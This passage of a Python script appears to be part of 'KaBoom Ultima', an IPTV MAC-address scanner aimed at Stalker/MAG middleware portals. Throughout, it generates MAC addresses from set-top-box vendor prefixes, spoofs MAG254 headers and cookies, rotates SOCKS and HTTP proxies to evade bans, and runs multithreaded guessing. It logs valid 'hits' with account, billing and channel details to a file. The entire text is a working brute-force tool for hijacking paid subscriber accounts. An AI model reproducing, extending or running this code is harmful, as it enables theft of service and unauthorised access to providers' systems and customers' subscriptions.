			serieslist=serieslist.replace("⍟PL"," |🇵🇱 PL")
			serieslist=serieslist.replace("⍟PT"," |🇵🇹 PT")
			serieslist=serieslist.replace("⍟PPV"," |🥊 PPV")
			serieslist=serieslist.replace("⍟QA"," |🇶🇦 QA")
			serieslist=serieslist.replace("⍟RO"," |🇷🇴 RO")
			serieslist=serieslist.replace("⍟RU"," |🇷🇺 RU")
			serieslist=serieslist.replace("⍟SA"," |🇸🇦 SA")
			serieslist=serieslist.replace("⍟SCREENSAVER"," | 🏞 SCREENSAVER")
			serieslist=serieslist.replace("⍟SE"," |🇸🇪 SE")
			serieslist=serieslist.replace("⍟SK"," |🇸🇰 SK")
			serieslist=serieslist.replace("⍟SL"," |🇸🇮 SL")
			serieslist=serieslist.replace("⍟SG"," |🇸🇬 SG")
			serieslist=serieslist.replace("⍟SR"," |🇷🇸 SR")
			serieslist=serieslist.replace("⍟SU"," |🇦🇲 SU")
			serieslist=serieslist.replace("⍟TH"," |🇹🇭 TH")
			serieslist=serieslist.replace("⍟TR"," |🇹🇷 TR")
			serieslist=serieslist.replace("⍟TW"," |🇹🇼 TW")
			serieslist=serieslist.replace("⍟UKR"," |🇺🇦 UKR")
			serieslist=serieslist.replace("⍟US"," |🇺🇸 US")
			serieslist=serieslist.replace("⍟VN"," |🇻🇳 VN")
			serieslist=serieslist.replace("⍟VIP"," | ⚽️ VIP")
			serieslist=serieslist.replace("⍟WEB"," |🔞 WEB")
			serieslist=serieslist.replace("⍟ZA"," |🇿🇦 ZA")
			serieslist=serieslist.replace("⍟AF"," |🇿🇦 AF")
			serieslist=serieslist.replace("⍟"," |®️ ")
		
		hityaz(mac,trh,real,m3ulink,m3uhost,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,country_name,scountry,kanalsayisi,filmsayisi,dizisayisi)
	
def vpnip(ip):
	url9= "http://ip-api.com/json/"+ip

	vpnip=""
	vpn="𝙽𝙾𝚃 𝙸𝙽𝚅𝙰𝙻𝙸𝙳"
	veri=""
	try:
		res = ses.get(url9,  timeout=7, verify=False)
		veri=str(res.text)
	except:
		vpn="𝙽𝙾𝚃 𝙸𝙽𝚅𝙰𝙻𝙸𝙳"
	if not '404 page' in veri:
		if 'country' in veri:
			vpnc=veri.split('city":"')[1]
			vpnc=vpnc.split('"')[0]
			vpnips=veri.split('country":"')[1]
			vpnips=vpnips.split('"')[0]
			vpn= vpnips +'/' +vpnc 
		else:
			vpn="𝙽𝙾𝚃 𝙸𝙽𝚅𝙰𝙻𝙸𝙳"
	return vpn
import socket
panel=url
print()
ban=""
uzmanm="portal.php"
realblue=""
reqs=(
"portal.php",
"server/load.php",
"c/portal.php",
"stalker_portal/server/load.php",
"stalker_portal/server/load.php - old",
"stalker_portal/server/load.php - «▣»",
"portal.php - Real Blue",
"server/load.php - Real Blue",
"portalstb",
"stalker_portal/server/load.php - httpS",
)
say=0
for i in reqs:
	say=say+1
	print(str(say)+"= "+str(i)+" " )
say=0
uzmanm=input('\n\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ             \33[0m\nType of Scan (1) = ')
if uzmanm=="0":
	uzmanm=input("Write Request:")
if uzmanm=="":
	uzmanm="1"
	
uzmanm=reqs[int(uzmanm)-1]
if uzmanm=="stalker_portal/server/load.php - old":
	stalker_portal="2"
	uzmanm="stalker_portal/server/load.php"
if uzmanm=="stalker_portal/server/load.php - «▣»":
	stalker_portal="1"
	uzmanm="stalker_portal/server/load.php"	
if uzmanm=="portal.php - No Ban":
	ban="ban"
	uzmanm="portal.php"
http="http"
if uzmanm=="portal.php - Real Blue":
	realblue="real"
if uzmanm=="server/load.php - Real Blue":
	realblue="real"
	uzmanm="portal.php"
if uzmanm=="portalstb":
	uzmanm="/portalstb/portal.php"
	http="http"
if uzmanm=="stalker_portal/server/load.php - httpS":
	uzmanm="stalker_portal/server/load.php"
	http="https"
print(uzmanm)
#uzmanm="magLoad.php"
panel=panel.replace('stalker_portal','')
panel=panel.replace('http://','')
panel=panel.replace('/c/','')
panel=panel.replace('/c','')
panel=panel.replace('/','')
panel=panel.replace(' ','')

#http://gotv.one/stalker_portal/c/
hitsay=0
Dosyab=rootDir+"/hits/" +panel.replace(":","_").replace('/','') +"_KaBoom.txt"
say=1
def yax(hits):
    dosya=open(Dosyab,'a+', encoding='utf-8')
    dosya.write(hits)
    dosya.close()

import urllib3
import os
def temizle():
    os.system("cls" if os.name == "nt" else "clear")
yeninesil=(
'00:1A:79:',
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
'00:2A:01:',
'dc:9a:2f:',
'00:1E:B8:',
'18:C8:E7:',
)
comboc=""
combototLen=""
combouz=0
combodosya=""
proxyc=""
proxytotLen=""
proxydosya=""
proxyuz=0

def dosyasec():
	global comboc,combototLen,proxyuz,proxydosya,combodosya,proxyc,proxytotLen,proxyuz,combouz,randomturu,serim,seri,mactur,randommu
	say=0
	dsy=""


	if comboc=="":
		mesaj="\n\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ              \33[0m\nSelect a Combo by number:"
		dir=rootDir+'combo/'
		dsy="\n       \33[1;4;94;47m 0= Random combination)  \33[0m\n"
	else:
		mesaj="\n\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ              \33[0m\n Select a Proxy file by number:"
		dir=rootDir+'proxy/'
	if not os.path.exists(dir):
	    os.mkdir(dir)
	for files in os.listdir (dir):
	 	say=say+1
	 	dsy=dsy+str(say)+"= "+files+'\n'
	print ("""combined files,
Choose 0 if there are no files
Choose your file for scanning!!

"""+dsy+"""
\33[33m """ +str(say)+""" Combinations found!
	""")
	dsyno=str(input("\33[31m"+mesaj+" \33[0m"))
	say=0
	for files in os.listdir (dir):
		 say=say+1
		 if dsyno==str(say):
		 	dosya=(dir+files)
		 	break
	say=0
	try:
		 if not dosya=="":
		 	print(dosya)
		 else:
		 		temizle()
		 		print("Incorrect combo file selection..!")
		 		quit()
	except:
		if comboc=="":
			if dsyno=="0" or dsyno=="":
				temizle()
				nnesil=str(yeninesil)
				nnesil=(nnesil.count(',')+1)
				for xd in range(0,(nnesil)):
		 			tire='  》'
		 			if int(xd) <9:
		 				tire='   》'
		 			print(str(xd+1)+tire+yeninesil[xd])
				#os.system("cls" if os.name == "nt" else "clear")

				mactur=input("\n\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ             \33[0m\nSelect the Mac ID(1): ")
				if mactur=="":
		 			mactur=1
				
				os.system("cls" if os.name == "nt" else "clear")
				randomturu=input("""
\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ              \33[0m
\nChoose the Mac combination type!

\33[0mCascading Mac \33[0m=1
\33[0mRandom Mac    \33[0m=2
		
\33[0m\33[1mChoose 1 or (2): \33[0m""")
				if randomturu=="":
		 			randomturu="2"
				serim=""
				
				os.system("cls" if os.name == "nt" else "clear")
				serim=input("""

\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ     \33[0m
\nUse Mac series?
Yes =1 
No  =2
		
Choose 1 or (2): """)
				mactur=yeninesil[int(mactur)-1]
				if serim =="1":
		 			seri=input("\nSample="+mactur+"\33[31m5\33[0m\nSample="+mactur+"\33[31mFa\33[32m\nWrite one or two values!\33[0m\n\33[1m"+mactur+"\33[31m")
				
				os.system("cls" if os.name == "nt" else "clear")
				combouz=input("""\33[0m
\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ            \33[0m		 		
\nNumber of Macs to scan 300K: """)
				if combouz=="":
		 			combouz=300000
				combouz=int(combouz)
				randommu="xdeep"
		else:
			temizle()
			print("Incorrect combo file selection...!")
			quit()
	if comboc=="":
		if randommu=="":
			combodosya=dosya
			comboc=open(dosya, 'r')
			combototLen=comboc.readlines()
			combouz=(len(combototLen))
		else:
			comboc='feyzo'
	else:
		#if not comboc=='feyzo':
			proxydosya=dosya
			proxyc=open(dosya, 'r')
			proxytotLen=proxyc.readlines()
			proxyuz=(len(proxytotLen))
			
randommu=""
dosyasec()

kanalkata="0"

os.system("cls" if os.name == "nt" else "clear")
kanalkata=input("""
\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ             \33[0m
\33[0m
Hit File Details

	0= Connection Only
	1= Connection and Channels
	2= ​​All Details
	
Enter selection(1): """)
if kanalkata=="":
	kanalkata="1"

os.system("cls" if os.name == "nt" else "clear")
proxi=input("""
\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ             \33[0m
\nDo you want to use proxies?

Yes =1
No  =2

Choose 1 or (2): """)

#print(feyzo) 
if proxi =="1":
 dosyasec()
 os.system("cls" if os.name == "nt" else "clear")
 pro=input("""
\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ             \33[0m
\nChoose the type of proxies you have?
	
	1 - ipVanish
	2 - Socks4 
	3 - Socks5
	4 - Http/Https
	
Proxy Type: """)
print(proxyuz)		

os.system("cls" if os.name == "nt" else "clear")
botgir=input("""
\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ              \33[0m
\nSelect the number bots
Bots (3): """)
if botgir=="":
	botgir=3
#os.system("cls" if os.name == "nt" else "clear")
	
		
expdate=input("""
\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ              \33[0m
\nSelect the Expiration length
Expiration > (0) days: """)
if expdate=="":
	expdate="0"
expdate = int(expdate)
# Prompt the user for delay input
delay = input("""
\033[0;94m KaBoom💫Ultima ᴾᴿᴱᴹᴵᵁᴹ         \33[0m
Choose the Delay in seconds??
example: 0.5 
Delay = """)

# Set default value if no input is provided
if delay.strip() == "":
    delay = 1
else:
    try:
        delay = float(delay)  # Convert input to a float
    except ValueError:
        print("Invalid input. Defaulting to 1 second.")
        delay = 1

# Example function utilizing the delay
def example_function():
    print("\nStarting process...")
    time.sleep(delay)  # Use the delay in seconds
    print(f"Process delayed by {delay} seconds.")

# Call the function
example_function()

proxysay=0

import re
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"


k=0
jj=0
iii=0
genmacs=""
bib=0
import random
def randommac():
	global genmacs,combosay
	combosay=combosay+1
	global k,jj,iii
	if randomturu == '2':
		while True:
			genmac = str(mactur)+"%02x:%02x:%02x"% ((random.randint(0, 256)),(random.randint(0, 256)),(random.randint(0, 256)))
			if not genmac in genmacs:
				genmacs=genmacs + ' '
				break
	else:
		if iii >= 257:
			iii=0
			jj=jj+1
		if jj >= 257:
			if not len(seri)==2:
				jj=0
			k=k+1
			if len(seri)==2:
				quit()
		if k==257:
			quit()
		genmac = str(mactur)+"%02x:%02x:%02x"% (k,jj,iii)
		iii=iii+1
	if serim=="1":
	   if len(seri) ==1:
	   	genmac=str(genmac).replace(str(genmac[:10]),str(mactur)+seri)
	   if len(seri)==2:
	   	genmac=str(genmac).replace(str(genmac[:11]),str(mactur)+seri)
	genmac=genmac.replace(':100',':10')
	genmac=genmac.upper()
	return genmac

import sys

def hea1(panel,mac):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/537.36" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
	}
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/537.36" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
		}
		
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/537.36" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
			}

	return data
	
def hea2(mac,token):
	macs=mac.upper()
	macs=urllib.parse.quote(mac)
	panell=panel
	if uzmanm=="stalker_portal/server/load.php":
		panell=str(panel)+'/stalker_portal'
	data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/537.36" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
	}
	
	if uzmanm=="stalker_portal/server/load.php":
		data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/537.36" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis;",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
		}
	if uzmanm=="stalker_portal/server/load.php":
		if stalker_portal=="1":
			data={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Safari/537.36" ,
"Referer": http+"://"+panell+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Authorization": "Bearer "+str(token),
			}
		
	return data

def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
         'may':5,
         'jun':6,
         'jul':7,
         'aug':8,
         'sep':9,
         'oct':10,
         'nov':11,
         'dec':12
        }
    s = ay.strip()[:3].lower()
    try:
        out = m[s]
        return out
    except:
        raise ValueError('Not a month')

from datetime import date
def tarih_clear(trh):
	ay=""
	gun=""
	yil=""
	trai=""
	my_date=""
	sontrh=""
	out=""
	ay=str(trh.split(' ')[0])
	gun=str(trh.split(', ')[0].split(' ')[1])
	yil=str(trh.split(', ')[1])
	ay=str(month_string_to_number(ay))
	trai=str(gun)+'/'+str(ay)+'/'+str(yil)
	my_date = str(trai)
	d = date(int(yil), int(ay), int(gun))
	sontrh = time.mktime(d.timetuple())
	out=(int((sontrh-time.time())/86400))
	return out
	
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import logging
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"

ses=requests.Session()

combosay=0

combosay=0
def combogetir():
	combogeti=""
	global combosay
	combosay=combosay+1
	try:
		combogeti=(combototLen[combosay])
	except:pass
	return combogeti



def proxygetir():
	if proxi =="1":
		global proxysay,bib
		bib=bib+1
		bekle(bib,"xdeep")
		if bib==15:
			bib=0
		while True:
			try:
				proxysay=proxysay+1
				if proxysay==proxyuz:
					proxysay=0
				
				proxygeti=(proxytotLen[proxysay])
				pveri=proxygeti.replace('\n','')
				
				pip=pveri.split(':')[0]
				pport=pveri.split(':')[1]
				
				if pro=="1":
					pname=pveri.split(':')[2]
					ppass=pveri.split(':')[3]
					proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
				if pro=="2":
					proxies={'http':'socks4://'+pip+':'+pport,'https':'socks4://'+pip+':'+pport}
				if pro=="3":
					proxies={'http':'socks5://'+pip+':'+pport,'https':'socks5://'+pip+':'+pport}
				if pro=="4":
					proxies={'http':'http://'+pip+':'+pport,'https':'https://'+pip+':'+pport}
				break
			except:pass
	else:
		proxies=""
	return proxies


import threading
for xdeep in range(int(botgir)):
	XDeep = threading.Thread(target=XD)
	XDeep.start()
	 
